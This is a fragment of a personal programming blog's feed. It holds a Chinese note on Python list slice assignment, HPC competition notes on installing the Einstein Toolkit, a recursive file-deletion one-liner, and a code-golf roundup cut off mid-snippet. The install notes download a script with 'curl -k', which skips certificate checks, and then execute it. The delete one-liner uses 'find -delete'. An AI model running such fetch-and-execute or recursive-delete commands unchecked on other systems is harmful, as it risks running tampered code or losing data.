&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;Add&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Equivalent&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  

&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;Extend&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;appending&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;given&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Equivalent&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;雖然只有 append 的部分，但可以看出有點相似，&lt;br /&gt;
跟 Apua 經過一番討論後，整理了一下重點：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;prepend  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;list.append  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;list.extend  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;prepend 和 append 的變化型都沒啥特別的，&lt;br /&gt;
用 insert 和 append 的可讀性其實比較高。&lt;br /&gt;
主要是 extend 的變化型有些有趣的東西可以討論。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這會在 l 原本的的 i-1 和 i 中 insert a, b, c 這三個 elements，&lt;br /&gt;
可以看作是可 insert 任意位置的 list.extend，&lt;br /&gt;
原本的 extend 只能把 iter 展開後加到 l 的最後面，&lt;br /&gt;
但這樣的寫法突破了這種限制。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後也可以把 l[i:i] = [a, b, c] 的兩個 i 換成一般正常使用的 slicing 方式，&lt;br /&gt;
被 slicing 選擇出來的區段就會直接被 a, b, c 取代掉。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;真的是第一次知道這種神奇的寫法...&lt;br /&gt;
Apua 猜測 list 的實作應該是跟 linked list 有關&lt;br /&gt;
之後有空的話來仔細看一下 python list 的實作好了  &lt;/p&gt;</summary><category term="Python"></category><category term="List"></category><category term="Slicing"></category><category term="Magic"></category></entry><entry><title>Note for TSCC 2015</title><link href="https://blog.m157q.tw/posts/2015/05/02/note-for-tscc-2015/" rel="alternate"></link><published>2015-08-27T16:39:17+08:00</published><updated>2015-08-27T16:39:17+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-05-02:posts/2015/05/02/note-for-tscc-2015/</id><summary type="html">&lt;h2&gt;System Preparation&lt;/h2&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="http://www.netlib.org/benchmark/hpl/"&gt;HPL&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="http://lammps.sandia.gov/"&gt;LAMMPS&lt;/a&gt;&lt;/h3&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="http://einsteintoolkit.org/"&gt;Einstein toolkit&lt;/a&gt;&lt;/h3&gt;
&lt;h4&gt;References&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/site/lincytw/cactus"&gt;https://sites.google.com/site/lincytw/cactus&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.einsteintoolkit.org/et-docs/Tutorial_for_New_Users"&gt;https://docs.einsteintoolkit.org/et-docs/Tutorial_for_New_Users&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://collapse2013.fudan.edu.cn/collapse/Talks/Loeffler.pdf"&gt;http://collapse2013.fudan.edu.cn/collapse/Talks/Loeffler.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.linuxjournal.com/content/numeric-relativity-einstein-toolkit"&gt;http://www.linuxjournal.com/content/numeric-relativity-einstein-toolkit&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Installation&lt;/h4&gt;
&lt;h5&gt;Get Herschel tarballs (released on Nov 19th, 2014)&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -kLO https://raw.githubusercontent.com/gridaphobe/CRL/ET_2014_11/GetComponents  

$ chmod a+x GetComponents  

$ ./GetComponents --parallel https://bitbucket.org/einsteintoolkit/manifest/raw/ET_2014_11/einsteintoolkit.th  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;May need to wait about 5 minutes (depend on the network speed)&lt;br /&gt;
After this, you should have a directory called "Cactus" contains tons of files.  &lt;/p&gt;
&lt;h5&gt;Compile&lt;/h5&gt;
&lt;p&gt;Configuration files can be found at &lt;code&gt;Cactus/simfactory/mdb/optionlists/*.cfg&lt;/code&gt;&lt;br /&gt;
The thornlist determine what to compile, can be found at &lt;code&gt;Cactus/thornlists/*.th&lt;/code&gt;.&lt;br /&gt;
Default will on ly have &lt;code&gt;einsteintoolkit.th&lt;/code&gt;&lt;br /&gt;
Find the proper config file and thornlist then copy them to the Cactus/  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; Cactus  
$ make &amp;lt;NAME&amp;gt;-config &lt;span class="nv"&gt;THORNLIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;BSSN_Hydro.th &lt;span class="nv"&gt;options&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;c3.cfg  
&lt;span class="c1"&gt;## Then config. You need say &amp;quot;yes&amp;quot; if asked.  &lt;/span&gt;
$ make &amp;lt;NAME&amp;gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&amp;lt;NAME&gt; is the name of the setting user-defined variable.&lt;br /&gt;
You can have different settings with different names.&lt;br /&gt;
Here I use tscc.  &lt;/p&gt;
&lt;h5&gt;Debug&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;Add &lt;code&gt;#include &amp;lt;math.h&amp;gt;&lt;/code&gt; into &lt;code&gt;arrangements/EinsteinAnalysis/AHFinderDirect/src/jtutil/cpm_map.cc&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;多核心高效能程式調教&lt;/h3&gt;
&lt;h4&gt;keywords&lt;/h4&gt;
&lt;p&gt;OpenMP, MPI, CUDA, OpenCL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CUDA  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://m157q.github.io/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="TSCC"></category><category term="HPC"></category><category term="Competition"></category></entry><entry><title>Recursively Delete Files with Specific Name in the Current Directory</title><link href="https://blog.m157q.tw/posts/2015/02/26/recursively-delete-files-with-specific-name-in-the-current-directory/" rel="alternate"></link><published>2015-10-28T14:11:00+08:00</published><updated>2015-10-28T14:11:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-26:posts/2015/02/26/recursively-delete-files-with-specific-name-in-the-current-directory/</id><summary type="html">&lt;h2&gt;Usage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Delete all the files which have same name with &lt;code&gt;${filename}&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find . -name &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;filename&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type f -delete  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Delete all files with .bak file extension in the current dir  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find . -name &lt;span class="s2"&gt;&amp;quot;*.bak&amp;quot;&lt;/span&gt; -type f -delete  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Doc&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-name pattern  
    True if the last component of the pathname being examined matches pattern.  
    Special shell pattern matching characters (``[&amp;#39;&amp;#39;, ``]&amp;#39;&amp;#39;, ``*&amp;#39;&amp;#39;, and ``?&amp;#39;&amp;#39;) may be used as part of pattern.  
    These characters may be matched explicitly by escaping them with a backslash (``\&amp;#39;&amp;#39;).  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or you can use regular expression for file matching.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-regex pattern  
    True if the whole path of the file matches pattern using regular expression.  
    To match a file named ``./foo/xyzzy&amp;#39;&amp;#39;, you can use the regular expression ``.*/[xyz]*&amp;#39;&amp;#39; or ``.*/foo/.*&amp;#39;&amp;#39;,  
    but not ``xyzzy&amp;#39;&amp;#39; or ``/foo/&amp;#39;&amp;#39;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://askubuntu.com/questions/377438/how-can-i-recursively-delete-all-files-of-a-specific-extension-in-the-current-di"&gt;command line - How can I recursively delete all files of a specific extension in the current directory? - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="one-liner"></category></entry><entry><title>Fifty Shades of Grey - Programmer Version</title><link href="https://blog.m157q.tw/posts/2015/02/18/fifty-shades-of-grey-programmer-version/" rel="alternate"></link><published>2015-02-18T22:36:42+08:00</published><updated>2015-02-18T22:36:42+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/fifty-shades-of-grey-programmer-version/</id><summary type="html">&lt;h1&gt;Reference&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://codegolf.stackexchange.com/questions/45736/fifty-shades-of-grey"&gt;code golf - Fifty Shades of Grey - Programming Puzzles &amp;amp; Code Golf Stack Exchange&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;Boys and girls are excited to see Fifty Shades of Grey on the silver screen, we just want to code without being bothered, so here's a challenge to pick our brain.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然後要求如下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Print on the screen fifty squares filled each with a different shade of grey  &lt;/li&gt;
&lt;li&gt;If your language of choice lacks image processing capabilities, you could output an image file  &lt;/li&gt;
&lt;li&gt;Squares must be visible, at least 20 x 20 pixels  &lt;/li&gt;
&lt;li&gt;You can not use random numbers unless you make sure each shade is unique.  &lt;/li&gt;
&lt;li&gt;You can not connect to any service over any network  &lt;/li&gt;
&lt;li&gt;You can not read any files in your program.  &lt;/li&gt;
&lt;li&gt;You can not use any libraries out of the standard libraries of your language of choice.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目前最多人按讚的是 Mathematica 寫的版本，只花 30 chars  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ArrayPlot&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;#2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ArrayPlot&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nv"&gt;#2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其他還有：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CJam - 23 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;P2&amp;quot;1e3K51_,1&amp;gt;K*$K*~]S*  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Mathematica - 34 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;GrayLevel&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;#&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Style&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Sage - 29 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plot&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Java - 180 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.awt.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Frame&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;paint&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Graphics&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span 